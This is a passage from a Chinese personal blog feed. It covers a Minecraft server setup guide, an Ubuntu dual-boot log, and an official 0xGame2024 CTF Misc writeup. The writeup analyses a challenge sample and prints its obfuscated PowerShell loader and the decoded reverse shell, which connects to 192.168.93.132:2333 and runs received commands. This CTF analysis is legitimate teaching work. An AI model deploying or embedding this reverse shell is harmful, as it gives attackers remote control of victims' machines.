class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mcsm-&#123;web,daemon&#125;</span><br><span class="line">systemctl stop mcsm-&#123;web,daemon&#125;</span><br></pre></td></tr></table></figure><h2 id="MC，启动！"><a href="#MC，启动！" class="headerlink" title="MC，启动！"></a>MC，启动！</h2><p>访问23333端口，即为MCSM的面板，自己注册一个账号。</p><p><strong>注意：这个账号只能在这时注册一次，一旦注册成功，其用户名和密码将无法再修改！所以一定要记住账号密码！</strong><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205194518342.png" alt="image-20241205194518342"></p><p>先在<a href="https://fabricmc.net/use/server/">fabric的官网</a>上下载一个服务端的核心</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195446296.png" alt="image-20241205195446296"></p><p>接下来就是在面板上创建一个实例</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195727811.png" alt="image-20241205195727811"></p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195802911.png" alt="image-20241205195802911"></p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195823300.png" alt="image-20241205195823300"></p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205195904336.png" alt="image-20241205195904336"></p><p>这里的启动命令我填写的是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xmx12G -server -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -jar <span class="variable">$&#123;ProgramName&#125;</span></span><br></pre></td></tr></table></figure><p>这里的<code>-Xmx12G</code>表示内存限制最大为12G，填写这个的时候根据自己的服务器实际情况来，比服务器内存小一点就行。剩下的<code>-Dfile.encoding=UTF-8</code>表示编码定义为UTF-8，<code>-Duser.language=zh</code>表示语言为中文，<code>-Duser.country=CN</code>表示国家为中国，防止后面出现乱码的问题。</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205200136679.png" alt="image-20241205200136679"></p><p>接下来在选择文件中上传我们刚刚下载的服务端核心，上传成功实例就会启动。</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205200644403.png" alt="image-20241205200644403"></p><p>接下来点击前往实例控制台，然后点击开启，等待下载一些配置，看到下面的输出即为安装成功</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201011935.png" alt="image-20241205201011935"></p><p>看到说Failed to load eula.txt，往下翻，点击服务端配置文件</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201153091.png" alt="image-20241205201153091"></p><p>编辑eula.txt</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201228724.png" alt="image-20241205201228724"></p><p>改为是以后点击保存</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201257796.png" alt="image-20241205201257796"></p><p>回到终端，再一次点击开启，看到一下输出即为启动成功</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205201510296.png" alt="image-20241205201510296"></p><p>至此，MC服务器已初步搭建完毕。</p><h2 id="一些更多的配置"><a href="#一些更多的配置" class="headerlink" title="一些更多的配置"></a>一些更多的配置</h2><h3 id="server-properties"><a href="#server-properties" class="headerlink" title="server.properties"></a>server.properties</h3><p>还是选择服务端配置文件，编辑server.properties</p><p>里面的标注其实已经很清楚了，照着按需求改就行</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205203942290.png" alt="image-20241205203942290"></p><h3 id="模组添加"><a href="#模组添加" class="headerlink" title="模组添加"></a>模组添加</h3><p>打开文件管理，找到mods文件夹，把模组放进去就行</p><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205212046811.png" alt="image-20241205212046811"></p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MC </tag>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>吾杯2024 Writeup</title>
      <link href="/2024/12/05/%E5%90%BE%E6%9D%AF2024-Writeup/"/>
      <url>/2024/12/05/%E5%90%BE%E6%9D%AF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E5%90%BE%E6%9D%AF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 吾杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu双系统安装记录</title>
      <link href="/2024/11/24/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/11/24/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>之前装过双系统没有写记录，导致现在又需要装就不得不又到处找文章。遂决定这一次写一下记录，方便之后查找。。。</p></blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/sslFxxx/article/details/140161076?ops_request_misc=&request_id=&biz_id=102&utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-140161076.142%5Ev100%5Epc_search_result_base1&spm=1018.2226.3001.4187">传送门一</a>，<a href="https://blog.csdn.net/weixin_65688914/article/details/132661114?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522cb99f07ca56697c5ff7a5b882bb2ea53%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=cb99f07ca56697c5ff7a5b882bb2ea53&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-132661114-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">传送门二</a>，<a href="https://blog.csdn.net/weixin_65688914/article/details/132661114?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522cb99f07ca56697c5ff7a5b882bb2ea53%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=cb99f07ca56697c5ff7a5b882bb2ea53&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-132661114-null-null.142%5Ev100%5Epc_search_result_base1&utm_term=ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">传送门三</a></p><p>首先在<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/24.10/">清华镜像源</a>下载需要的镜像，这里我下载的是ubuntu24.10</p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124184845671.png" alt="image-20241124184845671"></p><p>接下来需要准备一个8G以上的空U盘，用来制作启动盘。这里我用的是rufus4.6.exe。</p><img src="/images/ubuntu双系统安装记录/image-20241124185224489.png" alt="image-20241124185224489" style="zoom:50%;" /><img src="/images/ubuntu双系统安装记录/image-20241124185302414.png" alt="image-20241124185302414" style="zoom:50%;" /><p>在要安装双系统的电脑本身的windows上打开开始-磁盘管理，右键打算从中分出分出空间给ubuntu的磁盘，选择压缩卷</p><img src="/images/ubuntu双系统安装记录/image-20241124191552068.png" alt="image-20241124191552068" style="zoom:50%;" /><p>输入要分配出的空间大小，这里我分配了200个G，点击压缩</p><img src="/images/ubuntu双系统安装记录/image-20241124191739330.png" alt="image-20241124191739330" style="zoom:50%;" /><p>由于我的电脑是联想的，开机的时候按F12进入Boot Menu，选择USB HDD回车</p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124192853905.png" alt="image-20241124192853905"></p><p>直接选第一个回车</p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/0420f115bee9524fc5ff603f74dbe65.jpg" alt="0420f115bee9524fc5ff603f74dbe65"></p><p>进入后进行一系列配置，如下</p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202556638.png" alt="image-20241124202556638"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202602331.png" alt="image-20241124202602331"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202607349.png" alt="image-20241124202607349"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202615933.png" alt="image-20241124202615933"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202620614.png" alt="image-20241124202620614"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202626786.png" alt="image-20241124202626786"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202632823.png" alt="image-20241124202632823"><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202640936.png" alt="image-20241124202640936"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202647820.png" alt="image-20241124202647820"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202652450.png" alt="image-20241124202652450"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202658499.png" alt="image-20241124202658499"></p><p><img src="/images/ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/image-20241124202704096.png" alt="image-20241124202704096"></p><p>接下来等待一会儿，点击重启，拔掉U盘后按enter即可。</p><p>如有问题欢迎留言或者联系作者交流()</p>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Technology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2024 Writeup</title>
      <link href="/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024-Writeup/"/>
      <url>/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>跟w8nn9z师傅组队参加的这次比赛，题目质量挺不错的，能学到挺多东西</p></blockquote><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 极客大挑战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2024 Misc Official Writeup</title>
      <link href="/2024/11/11/0xGame2024-Misc-Official-Writeup/"/>
      <url>/2024/11/11/0xGame2024-Misc-Official-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>其中打*的是我出的题</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0xGame2048"><a href="#0xGame2048" class="headerlink" title="0xGame2048*"></a>0xGame2048*</h3><p>提取一下题目中的关键词”2048”、”base”搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622916-03061021-430b-4491-9ff6-b88909cd2313.png" alt="img"></p><h3 id="一明一暗"><a href="#一明一暗" class="headerlink" title="一明一暗*"></a>一明一暗*</h3><p>这道题在出题时使用的是Bandizip 7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现了无法执行攻击的问题，这里不是出题人本意o(╥﹏╥)o，出题时并没有想过在这里设置门槛，给师傅们磕一个了。Orz</p><p>然而仍然有很多厉害的师傅通过各种方法解出来了，比如挨个尝试各种压缩方法、通过文件大小判断正确的压缩方法、以及直接从attachment.zip中抽去1.zip使其成为一个明文包（膜拜），因此也就没有修改题目。</p><p>接下来说一下预期解。</p><p>首先将得到的f1ag.jpg压缩成一个明文包，然后使用ARCHPR执行明文攻击。明文攻击时用不着等这个进度条全部走完，只需要到如下状态就可以直接点停止，保存下来的zip文件就是已经解密好的。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622997-0f54f3e8-18f9-41cb-9e61-33ff855d4e70.png" alt="img"></p><p>根据hint.txt的内容可以得知这是一个盲水印，可以在网上找到这样一个工具，直接对flag.png提取就行。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622960-e9c19936-d8bd-4e81-9b42-76cb973c1488.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912623024-5f16fd12-1eb9-4319-a296-a1b952a611a7.png" alt="img"></p><h3 id="加密的压缩包？"><a href="#加密的压缩包？" class="headerlink" title="加密的压缩包？"></a>加密的压缩包？</h3><p>用010editor查看，压缩包末尾给了一个password，可知这个压缩包原本应该是被加密了的。但是从加密标识位（下图选中部分）来看，这里是被设置成了未加密，因此这里其实是个伪不加密。</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912623005-978bd4db-fcff-4198-b5a7-417be0fbf4b8.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624583-1db33a15-a6d4-4219-8c9d-9f2e4c532379.png" alt="img"></p><p>将加密位改为09以后保存，输入密码0xGame2024即可解压</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624629-9d5cbb81-7a05-4571-bc87-600f74274f37.png" alt="img"></p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624616-b7537c66-a4af-4b79-a4eb-33a673bc544b.png" alt="img"></p><h3 id="我的世界基岩版"><a href="#我的世界基岩版" class="headerlink" title="我的世界基岩版(?*"></a>我的世界基岩版(?*</h3><p>先说一下预期解：</p><p>下载地图模组xaero’s minimap和xaero’s worldmap即可大概看到flag的轮廓，就是地上的那些基岩组成的字。接下来就是实地考察一下+尝试，可以得到flag是0xGame{MC_SErver_4_CTFers}</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624631-d9a0ec8e-69aa-449c-97c9-63c33a005235.png" alt="img"></p><p>此外还有很多方法也都在预期之内，比如向上搭天梯看、使用tweakeroo模组直接灵魂出窍飞起来看、或者直接开各种各样的外挂都行。</p><p>服务器开出来一段时间后，有师傅搭建并维护了出生点物资领取处、天路、铁轨等造福后来的师傅（辛苦了）。但也有一些调皮的师傅，到处插告示牌在上面留假flag或者做假引导，出题人都在发现的第一时间进行了拆除。所以不要再拷打出题人了，那真的不是题目的一部分o(╥﹏╥)o :(</p><h3 id="呜呜呜-我再也不敢乱点了"><a href="#呜呜呜-我再也不敢乱点了" class="headerlink" title="呜呜呜~我再也不敢乱点了*"></a>呜呜呜~我再也不敢乱点了*</h3><p>灵感来源于CVE-2023-38831，当时看到感觉挺有意思的，就当成题出了</p><p>不过从解题来说知不知道这个CVE影响其实不大，感兴趣的可以了解一下</p><p>题目附件给了一个 <code>somethingGOOD.pcapng</code> 和一个<code>what_is_this.log</code>，打开流量包可以看到是TLS1.3协议的流量：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036561-30c65c77-4951-49ca-9e26-ebd61908ddae.png" alt="img"></p><p>查阅资料可知可以用 <code>key log</code> 文件，也就是<code>what_is_this.log</code>来解密TLS流量，在wireshark中的 <code>编辑-&gt;首选项-&gt;协议</code> 里找到TLS：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036668-894ee1a9-1641-448f-b719-bbd2bab0a8c0.png" alt="img"></p><p>之后就能看到http协议传输的 <code>wuyu.zip</code>，可以在 <code>文件-&gt;导出对象-&gt;HTTP</code> 中提取出来并解压，可以看到<code>introduction.txt </code>目录下有两个可疑文件，<code>clean_file_rubbish.ps1</code> 以及 <code>introduction.txt .bat</code></p><p>可以先对 <code>introduction.txt .bat</code> 进行分析，里面大部分是注释，真正执行的是当前目录下的ps1脚本文件：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036684-ddc2aca5-d1ae-4803-a1f3-3d10036c15c9.png" alt="img"></p><p>于是可以继续分析 <code>clean_file_rubbish.ps1</code> ，表面上是一个清理文件的功能，但同样这些代码都是被注释掉的，往下拖拉可以看到真正被混淆的powershell代码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># just some unordered and garbled characters</span></span><br><span class="line"><span class="variable">$Cx99zNP0yc8btz1DgdjQ4d6Or1WXvNo8ujcqwFC3kgHFE9zERLRSUflsWbCwFagZeNLAt8td0BUZr85MNnhsIJtjt4781b120rrHzFZmMsUAPcAS4tHCiJx9Vst4SWWeSBn8IkFD6e4O6bMfzboKxPZiplfSpAXYD1iHJbuWsDciLYdqfa9TcbYHOWxeR91cFzmnKRYSFU573fAKQqZMCsiaLB2ZMGMlIbshBlb94PHljepzqNuqEo2uRQ0Pg4hLsKE7D4cXoCXuDAUwHPVQm3Jz6KQcfUWAlvGzhQKyzLBXGta8LH6Ua0yL8nFCPU4O3uIh58sIpSPEdxO4HkYZfKSF9ta6hrN2o8YWfbRMIdMHNNgywFv3YVlCzwKWP3suJq7yHHl0O0MW7dtk2t05bteVH0k4O0HOfKLQ4wDPrnwu5Q1d7L6JLvNEC9dAtXx56ACbzCHQMt8ZIaxZeLxWMnB7Q34pe0bmoO1hPZtiRENA4Scp1Gsm</span> = <span class="string">&quot;JExIT1NUID0gIjE5Mi4xNjguOTMuMTMyIjsgJExQT1JUID0gMjMzMzsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t think too much</span></span><br><span class="line"><span class="variable">$SsuhfRO1wgyokMOlaEmBBcAzcInXG54WdHo9eVpNI9Xhb0kluCXXz5hxYS7pzUgJOfnpV8ZkPMhHNCtTMkSg1Sj32zonCoq4qXXfBsmASttQtGic0mBErHBYS6ROmJohHmnHTYa2ijVwYv8vfzgFLW6rPkY1LpsEVrbfCqc6QFCdo3mzQIkyU1pbPKuH2IDPbkYshWZYoiLxtYBdsGa6ZtvZ8WpbYhmHEcXG4RGhhoLPTnTITmSZJ7rm24GYws75qN4ZOH4Wf9IBSHuRLtOmGVi23anihNphBV8IkTmT6vhChsJwC6HY1zTN4lbA4wmdtEjhSyEF3pY2XLm8RTzIZAkoAiKvzD7V1rLdMa5nUo0c2eDe9wpnJ1qWhOy1GuVYMFI09bVegrdWHlQ4np4GWDAlc8FJhzM6gzRHwbklJmLtPcwm1MFf0vlh9lLqLpMdS586AnnBMuJezW6Tpmta4O5HaDxLsb3S8l3wTxCjoad1BdqAoZa1</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$Cx99zNP0yc8btz1DgdjQ4d6Or1WXvNo8ujcqwFC3kgHFE9zERLRSUflsWbCwFagZeNLAt8td0BUZr85MNnhsIJtjt4781b120rrHzFZmMsUAPcAS4tHCiJx9Vst4SWWeSBn8IkFD6e4O6bMfzboKxPZiplfSpAXYD1iHJbuWsDciLYdqfa9TcbYHOWxeR91cFzmnKRYSFU573fAKQqZMCsiaLB2ZMGMlIbshBlb94PHljepzqNuqEo2uRQ0Pg4hLsKE7D4cXoCXuDAUwHPVQm3Jz6KQcfUWAlvGzhQKyzLBXGta8LH6Ua0yL8nFCPU4O3uIh58sIpSPEdxO4HkYZfKSF9ta6hrN2o8YWfbRMIdMHNNgywFv3YVlCzwKWP3suJq7yHHl0O0MW7dtk2t05bteVH0k4O0HOfKLQ4wDPrnwu5Q1d7L6JLvNEC9dAtXx56ACbzCHQMt8ZIaxZeLxWMnB7Q34pe0bmoO1hPZtiRENA4Scp1Gsm</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># If you don’t believe it, you can try it</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> <span class="variable">$SsuhfRO1wgyokMOlaEmBBcAzcInXG54WdHo9eVpNI9Xhb0kluCXXz5hxYS7pzUgJOfnpV8ZkPMhHNCtTMkSg1Sj32zonCoq4qXXfBsmASttQtGic0mBErHBYS6ROmJohHmnHTYa2ijVwYv8vfzgFLW6rPkY1LpsEVrbfCqc6QFCdo3mzQIkyU1pbPKuH2IDPbkYshWZYoiLxtYBdsGa6ZtvZ8WpbYhmHEcXG4RGhhoLPTnTITmSZJ7rm24GYws75qN4ZOH4Wf9IBSHuRLtOmGVi23anihNphBV8IkTmT6vhChsJwC6HY1zTN4lbA4wmdtEjhSyEF3pY2XLm8RTzIZAkoAiKvzD7V1rLdMa5nUo0c2eDe9wpnJ1qWhOy1GuVYMFI09bVegrdWHlQ4np4GWDAlc8FJhzM6gzRHwbklJmLtPcwm1MFf0vlh9lLqLpMdS586AnnBMuJezW6Tpmta4O5HaDxLsb3S8l3wTxCjoad1BdqAoZa1</span></span><br></pre></td></tr></table></figure><p>主要是将变量名变得复杂一些+base64加密关键代码，最终解完混淆可以发现执行了一个反弹shell的操作：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$LHOST</span> = <span class="string">&quot;192.168.93.132&quot;</span>; <span class="variable">$LPORT</span> = <span class="number">2333</span>; <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="variable">$LHOST</span>, <span class="variable">$LPORT</span>); <span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream(); <span class="variable">$StreamReader</span> = <span class="built_in">New-Object</span> IO.StreamReader(<span class="variable">$NetworkStream</span>); <span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>); <span class="variable">$StreamWriter</span>.AutoFlush = <span class="variable">$true</span>; <span class="variable">$Buffer</span> = <span class="built_in">New-Object</span> System.Byte[] <span class="number">1024</span>; <span class="keyword">while</span> (<span class="variable">$TCPClient</span>.Connected) &#123; <span class="keyword">while</span> (<span class="variable">$NetworkStream</span>.DataAvailable) &#123; <span class="variable">$RawData</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length); <span class="variable">$Code</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$RawData</span> <span class="literal">-1</span>) &#125;; <span class="keyword">if</span> (<span class="variable">$TCPClient</span>.Connected <span class="operator">-and</span> <span class="variable">$Code</span>.Length <span class="operator">-gt</span> <span class="number">1</span>) &#123; <span class="variable">$Output</span> = <span class="keyword">try</span> &#123; <span class="built_in">Invoke-Expression</span> (<span class="variable">$Code</span>) <span class="number">2</span>&gt;&amp;<span class="number">1</span> &#125; <span class="keyword">catch</span> &#123; <span class="variable">$_</span> &#125;; <span class="variable">$StreamWriter</span>.Write(<span class="string">&quot;<span class="variable">$Output</span>`n&quot;</span>); <span class="variable">$Code</span> = <span class="variable">$null</span> &#125; &#125;; <span class="variable">$TCPClient</span>.Close(); <span class="variable">$NetworkStream</span>.Close(); <span class="variable">$StreamReader</span>.Close(); <span class="variable">$StreamWriter</span>.Close()</span><br></pre></td></tr></table></figure><p>之后计算MD5值就能得到flag：</p><p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036760-2b3aad84-9059-4d8d-b90b-abbea4d9957d.png" alt="img"></p><h3 id="我叫曼波"><a href="#我叫曼波" class="headerlink" title="我叫曼波"></a>我叫曼波</h3><p>题目附件给了 <code>encode.py</code>，加密的流程基本都给出了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;0xGame&#123;This_is_a_fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">real_real_real_random</span>():</span><br><span class="line">    random_num = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 